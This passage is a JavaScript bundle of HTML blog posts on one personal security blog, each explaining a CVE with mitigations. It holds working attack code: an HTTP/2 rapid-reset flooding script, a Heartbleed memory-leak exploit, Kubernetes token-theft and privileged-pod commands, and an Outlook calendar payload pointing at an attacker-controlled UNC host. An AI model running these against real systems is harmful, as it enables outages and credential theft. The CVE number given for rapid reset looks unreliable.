TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Qf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Yf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Kf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,qf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Zf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
